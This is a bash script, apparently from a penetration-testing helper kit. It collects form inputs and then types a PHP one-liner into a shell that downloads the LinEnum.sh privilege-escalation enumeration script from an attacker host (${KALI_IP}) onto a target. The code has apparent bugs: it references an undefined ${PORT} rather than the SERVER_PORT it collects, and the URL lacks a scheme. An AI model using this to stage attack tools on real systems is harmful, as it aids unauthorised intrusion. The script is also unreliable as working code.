#!/bin/bash

: '
php: download file one liner with fopen
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SERVER_PORT_FIELD=$(form_item  "server port" "number" "server_port" "80")
SERVER_FILE_FIELD=$(form_item  "server file location" "server_file_location" "/LinEnum.sh")
LOCAL_FILE_FIELD=$(form_item  "local file location" "local_file_location" "LinEnum.sh")

# Generate GUI form
generate_form "${SERVER_PORT_FIELD}" "${SERVER_FILE_FIELD}" "${LOCAL_FILE_FIELD}"

SERVER_PORT=${form_data["server_port"]}
SERVER_FILE=${form_data["server_file_location"]}
LOCAL_FILE=${form_data["local_file_location"]}

paste_command "php -r 'const BUFFER = 1024; \$fremote = fopen(\"${KALI_IP}:${PORT}/${SERVER_FILE}\", \"rb\"); \$flocal = fopen(\"${LOCAL_FILE}\", \"wb\"); while (\$buffer = fread(\$fremote, BUFFER)) { fwrite(\$flocal, \$buffer); } fclose(\$flocal); fclose(\$fremote);'"
xdotool key Return
